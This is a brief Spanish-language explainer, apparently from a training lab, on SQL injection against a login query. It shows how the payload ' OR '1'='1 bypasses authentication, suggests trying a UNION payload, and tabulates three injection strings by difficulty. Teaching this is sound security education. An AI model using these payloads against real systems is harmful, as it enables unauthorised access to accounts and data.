Informacion: SQL Injection

SQL Injection (SQLi) ocurre cuando un atacante inyecta código SQL en un campo de input, modificando la consulta que el servidor ejecuta.

SELECT * FROM users
WHERE username = 'usuario' AND password = 'pass'

Si un atacante ingresa en password: ' OR '1'='1, la query se convierte en:

SELECT * FROM users
WHERE username = 'usuario' AND password = '' OR '1'='1'

✅ La condición '1'='1' siempre es verdadera, el usuario entra sin contraseña válida!

Tecnicas de SQLi

❌ Técnica OR 1=1 (Clásica)

La más conocida pero a veces bloqueada:

Intenta: ' OR '1'='1

✅ Técnica UNION (Alternativa)

Usa UNION para combinar resultados de otra tabla:

Intenta: ' UNION SELECT 1,1,1 -- -

Comparativa de Ataques

Técnica Payload Dificultad
OR 1=1 ' OR '1'='1 Muy Fácil
UNION ' UNION SELECT 1,1,1 -- - Moderada
Booleano ' AND 1=1 -- - Media
